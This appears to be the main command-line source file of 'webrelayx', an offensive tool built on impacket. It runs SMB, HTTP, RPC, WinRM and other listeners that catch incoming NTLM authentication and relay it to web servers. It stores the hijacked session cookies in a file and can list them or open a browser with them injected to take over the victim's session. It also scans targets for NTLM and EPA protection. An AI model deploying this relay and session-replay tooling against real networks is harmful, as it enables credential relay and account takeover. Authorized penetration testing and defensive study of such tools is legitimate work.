import argparse
import http.client
import logging
import re
import signal
import socket
import subprocess
import sys
from threading import Event

from impacket import LOG, version
from impacket.examples import logger as impacket_logger
from impacket.examples.ntlmrelayx.servers import (
    HTTPRelayServer,
    RAWRelayServer,
    RPCRelayServer,
    SMBRelayServer,
    WCFRelayServer,
    WinRMRelayServer,
    WinRMSRelayServer,
)
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

from webrelayx.util.cookies import SessionReplay
from webrelayx.util.relay_client import WebRelayXClient, WebRelayXClientHTTPS

PROTOCOL_CLIENTS = {
    "HTTP": WebRelayXClient,
    "HTTPS": WebRelayXClientHTTPS,
}

PROTOCOL_ATTACKS = {
    "HTTP": SessionReplay,
    "HTTPS": SessionReplay,
}


def _build_target_processor(targets: list[str]) -> TargetsProcessor:
    processor = TargetsProcessor(
        singleTarget=targets[0],
        protocolClients=PROTOCOL_CLIENTS,
    )
    for extra in targets[1:]:
        processor.originalTargets.extend(
            TargetsProcessor.processTarget(extra, PROTOCOL_CLIENTS)
        )
    processor.reloadTargets(full_reload=True)
    return processor


def _add_target_args(p: argparse.ArgumentParser) -> None:
    grp = p.add_mutually_exclusive_group(required=True)
    grp.add_argument(
        "-t",
        "--target",
        action="append",
        dest="targets",
        metavar="URL",
        help=("HTTP/HTTPS target URL(s)."),
    )
    grp.add_argument(
        "-tf",
        "--targets-file",
        dest="targets_file",
        metavar="FILE",
        help="Text file with one target URL per line.",
    )


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="webrelayx",
        description="NTLM relay + scanner tool for web servers.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Enable verbose / debug logging.",
    )
    subparsers = parser.add_subparsers(dest="subcommand", metavar="<subcommand>")
    subparsers.required = False

    # relay subcommand
    relay_p = subparsers.add_parser(
        "relay",
        help="Relay NTLM auth to HTTP/HTTPS targets and capture session cookies.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=(
            "Listen on various protocols for incoming NTLM and relay to specified HTTP(S) targets."
        ),
    )
    _add_target_args(relay_p)

    listener = relay_p.add_argument_group("Listener")
    listener.add_argument(
        "-l",
        "--listen-ip",
        default="0.0.0.0",
        metavar="IP",
        help="IP address to bind all listeners to (default: 0.0.0.0).",
    )

    disable = relay_p.add_argument_group("Disable listeners")
    disable.add_argument(
        "--no-smb-server", action="store_true", help="Disable SMB listener."
    )
    disable.add_argument(
        "--no-http-server", action="store_true", help="Disable HTTP listener."
    )
    disable.add_argument(
        "--no-wcf-server", action="store_true", help="Disable WCF listener."
    )
    disable.add_argument(
        "--no-raw-server", action="store_true", help="Disable RAW listener."
    )
    disable.add_argument(
        "--no-rpc-server", action="store_true", help="Disable RPC listener."
    )
    disable.add_argument(
        "--no-winrm-server", action="store_true", help="Disable WinRM/WinRMS listeners."
    )

    out = relay_p.add_argument_group("Output")
    out.add_argument(
        "-b",
        "--open-browser",
        action="store_true",
        help=(
            "After a successful relay, spawn a browser with the captured cookies injected and navigate to the target URL."
        ),
    )
    out.add_argument(
        "--browser",
        dest="browser_type",
        choices=["chromium", "firefox", "webkit"],
        default="chromium",
        metavar="BROWSER",
        help="Browser to use with --open-browser: chromium, firefox, or webkit (default: chromium).",
    )

    # list subcommand
    subparsers.add_parser(
        "list",
        help="List all captured sessions stored in cookies.jsonl.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Print every saved session with its index, identity, target, and cookie count.",
    )

    # launch subcommand
    launch_p = subparsers.add_parser(
        "launch",
        help="Open a browser with the cookies from a saved session.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=(
            "Load a session from cookies.jsonl by index (use 'list' to find the index) and open a Playwright browser with those cookies already injected."
        ),
    )
    launch_p.add_argument(
        "-i",
        "--index",
        type=int,
        required=True,
        metavar="INDEX",
        help="Session index as shown by the 'list' subcommand.",
    )
    launch_p.add_argument(
        "--browser",
        dest="browser_type",
        choices=["chromium", "firefox", "webkit"],
        default="chromium",
        metavar="BROWSER",
        help="Browser to open: chromium, firefox, or webkit (default: chromium).",
    )

    # scan subcommand
    scan_p = subparsers.add_parser(
        "scan",
        help="Probe HTTP(S) targets for NTLM auth and EPA status.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=(
            "Checks the target for NTLM authentication and tries to determine EPA status."
        ),
    )
    _add_target_args(scan_p)

    return parser


def main() -> None:
    parser = _build_parser()
    args = parser.parse_args()

    if args.subcommand is None:
        parser.print_help()
        sys.exit(0)

    impacket_logger.init()
    level = logging.DEBUG if args.verbose else logging.INFO
    logging.getLogger().setLevel(level)

    if args.verbose:
        LOG.info("Verbose logging enabled")
        http.client.HTTPConnection.debuglevel = 1

    match args.subcommand:
        case "scan":
            _cmd_scan(args)
        case "relay":
            _cmd_relay(args)
        case "list":
            _cmd_list(args)
        case "launch":
            _cmd_launch(args)
        case _:
            LOG.error("Unknown subcommand: %s", args.subcommand)
            sys.exit(1)


def _cmd_list(args: argparse.Namespace) -> None:
    import json

    try:
        with open("cookies.jsonl") as fh:
            records = [json.loads(line) for line in fh if line.strip()]
    except FileNotFoundError:
        print("No cookies.jsonl found.")
        return

    if not records:
        print("No sessions stored.")
        return

    id_w, tgt_w = 40, 50
    print(f"{'#':<4}  {'Identity':<{id_w}}  {'Target':<{tgt_w}}  {'Cookies':>7}")
    print("-" * (4 + 2 + id_w + 2 + tgt_w + 2 + 7))
    for i, rec in enumerate(records):
        identity = rec.get("identity", "?")
        target = rec.get("target", "?")
        count = len(rec.get("cookies", []))
        print(f"{i:<4}  {identity:<{id_w}}  {target:<{tgt_w}}  {count:>7}")


def _cmd_launch(args: argparse.Namespace) -> None:
    import json

    from webrelayx.util.shared import (
        ensure_playwright_browser,
        launch_browser_with_cookies,
    )

    try:
        with open("cookies.jsonl") as fh:
            records = [json.loads(line) for line in fh if line.strip()]
    except FileNotFoundError:
        LOG.error("No cookies.jsonl found. Run 'relay' first to capture sessions.")
        sys.exit(1)

    if not records:
        LOG.error("cookies.jsonl is empty. No sessions to launch.")
        sys.exit(1)

    idx = args.index
    if idx < 0 or idx >= len(records):
        LOG.error(
            "Index %d is out of range (0-%d). Use 'list' to see available sessions.",
            idx,
            len(records) - 1,
        )
        sys.exit(1)

    rec = records[idx]
    target_url = rec.get("target", "")
    cookies_raw = rec.get("cookies", [])
    identity = rec.get("identity", "?")

    if not cookies_raw:
        LOG.error(
            "Session #%d (%s -> %s) has no cookies stored.", idx, identity, target_url
        )
        sys.exit(1)

    if not ensure_playwright_browser(args.browser_type):
        LOG.error(
            "[!] Playwright setup failed. Install with: pip install 'webrelayx[browser]'"
        )
        sys.exit(1)

    LOG.info(
        "Launching %s for session #%d: %s -> %s",
        args.browser_type,
        idx,
        identity,
        target_url,
    )
    launch_browser_with_cookies(target_url, cookies_raw, args.browser_type)


def _cmd_scan(args: argparse.Namespace) -> None:
    from webrelayx.util.scanner import run_scan

    if args.targets_file:
        with open(args.targets_file) as fh:
            targets = [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    else:
        targets = args.targets

    run_scan(targets)


def _cmd_relay(args: argparse.Namespace) -> None:
    LOG.info("webrelayx relay  |  impacket %s", version.version)

    if args.targets_file:
        target_processor = TargetsProcessor(
            targetListFile=args.targets_file,
            protocolClients=PROTOCOL_CLIENTS,
        )
    else:
        from webrelayx.util.shared import _normalize_url

        target_processor = _build_target_processor(
            [_normalize_url(t) for t in args.targets]
        )

    LOG.info(
        "Relay targets: %s",
        ", ".join(t.geturl() for t in target_processor.originalTargets),
    )

    if args.listen_ip == "0.0.0.0":
        try:
            out = subprocess.run(
                ["ip", "-4", "addr", "show"],
                capture_output=True,
                text=True,
                timeout=3,
            ).stdout
            listen_ips = sorted(
                {
                    m.group(1)
                    for m in re.finditer(r"inet (\d+\.\d+\.\d+\.\d+)", out)
                    if not m.group(1).startswith("127.")
                }
            )
        except Exception:
            listen_ips = []
        listen_ips = listen_ips or ["0.0.0.0"]
    else:
        listen_ips = [args.listen_ip]
    LOG.info("Listening on: %s", ", ".join(listen_ips))

    def _make_config(port: int) -> NTLMRelayxConfig:
        c = NTLMRelayxConfig()
        c.setInterfaceIp(args.listen_ip)
        c.setListeningPort(port)
        c.setTargets(target_processor)
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setDisableMulti(False)
        c.setSMB2Support(True)
        c.mode = "RELAY"
        c.openBrowser = args.open_browser
        c.browserType = args.browser_type
        return c

    if args.open_browser:
        from webrelayx.util.shared import ensure_playwright_browser

        if not ensure_playwright_browser(args.browser_type):
            LOG.error(
                "[!] --open-browser is disabled because Playwright could not be set up."
            )
            args.open_browser = False

    server_specs = [
        (args.no_smb_server, SMBRelayServer, 445, "SMB"),
        (args.no_http_server, HTTPRelayServer, 80, "HTTP"),
        (args.no_wcf_server, WCFRelayServer, 9389, "WCF"),
        (args.no_raw_server, RAWRelayServer, 6666, "RAW"),
        (args.no_rpc_server, RPCRelayServer, 135, "RPC"),
        (args.no_winrm_server, WinRMRelayServer, 5985, "WinRM"),
        (args.no_winrm_server, WinRMSRelayServer, 5986, "WinRMS"),
    ]

    relay_threads = []
    for disabled, server_cls, port, label in server_specs:
        if disabled:
            LOG.info("Skipping %s relay listener (disabled)", label)
            continue
        try:
            s = server_cls(_make_config(port))
            s.start()
            relay_threads.append(s)
        except PermissionError:
            LOG.error(
                "Permission denied binding to port %d for %s listener. "
                "Try running as root (sudo).",
                port,
                label,
            )
            sys.exit(1)

    LOG.info("Listening for incoming connections.  Press Ctrl-C to stop.")

    shutdown_event = Event()

    def _handle_sigint(sig, frame):
        LOG.info("Shutting down webrelayx")
        shutdown_event.set()

    signal.signal(signal.SIGINT, _handle_sigint)
    signal.signal(signal.SIGTERM, _handle_sigint)

    shutdown_event.wait()
    sys.exit(0)


if __name__ == "__main__":
    main()
